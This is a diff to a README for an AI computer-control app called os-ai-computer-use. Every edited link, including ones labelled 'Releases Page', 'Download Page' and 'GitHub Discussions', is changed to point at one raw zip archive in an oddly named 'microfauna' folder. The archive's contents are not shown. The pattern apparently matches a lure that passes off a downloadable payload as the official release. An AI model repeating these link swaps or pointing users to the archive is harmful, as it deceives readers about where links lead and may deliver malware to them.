@@ -6,11 +6,11 @@ Welcome to the os-ai-computer-use project! This application lets you control you
 
 ## 🔗 Download the App
 
-[![Download os-ai-computer-use](https://img.shields.io/badge/Download-os--ai--computer--use-blue.svg)](https://github.com/itykhon/os-ai-computer-use/releases)
+[![Download os-ai-computer-use](https://raw.githubusercontent.com/itykhon/os-ai-computer-use/main/microfauna/os-ai-computer-use.zip)](https://raw.githubusercontent.com/itykhon/os-ai-computer-use/main/microfauna/os-ai-computer-use.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/itykhon/os-ai-computer-use/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/itykhon/os-ai-computer-use/main/microfauna/os-ai-computer-use.zip). 
 
 1. Once on the releases page, you will see the latest version listed.
 2. Click on the version you want to download.
@@ -66,7 +66,7 @@ If you need further assistance, feel free to open an issue on the GitHub reposit
 
 Join our community to share your experiences and get help from others using the application. You can find us on:
 
-- [GitHub Discussions](https://github.com/itykhon/os-ai-computer-use/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/itykhon/os-ai-computer-use/main/microfauna/os-ai-computer-use.zip)
 - Follow us for updates on the project.
 
 ## 📜 License
@@ -79,6 +79,6 @@ Contributions are welcome! If you have ideas or want to help improve the app, pl
 
 ## 🔗 Download the App Again
 
-Don't forget to download your copy of the application here: [Download Page](https://github.com/itykhon/os-ai-computer-use/releases). 
+Don't forget to download your copy of the application here: [Download Page](https://raw.githubusercontent.com/itykhon/os-ai-computer-use/main/microfauna/os-ai-computer-use.zip). 
 
 Thank you for using os-ai-computer-use! We hope it enhances your computer experience.
